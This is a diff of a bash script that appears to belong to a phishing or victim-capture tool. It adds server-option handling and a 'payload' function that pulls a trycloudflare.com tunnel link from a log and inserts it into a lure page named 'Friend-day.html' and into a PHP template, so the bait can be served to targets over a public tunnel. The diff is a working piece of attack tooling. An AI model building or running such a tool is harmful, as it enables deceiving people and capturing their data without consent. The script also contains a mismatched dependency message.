@@ -291,9 +291,42 @@ option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 2 ]]; then
 
 
-echo
-		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
-		         sleep 2
-                         exit
-		         fi
-                         done
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+start
+
+elif [[ $option_server -eq 1 ]]; then
+ngrok_server
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start1
+fi
+
+}
+
+
+payload() {
+
+send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+
+sed 's+forwarding_link+'$send_link'+g' Friend-day.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+
+
+}
+
+start() {
+
+
+
+server
+payload
+checkfound
+
+}
+
+
+dependencies
+start1
+
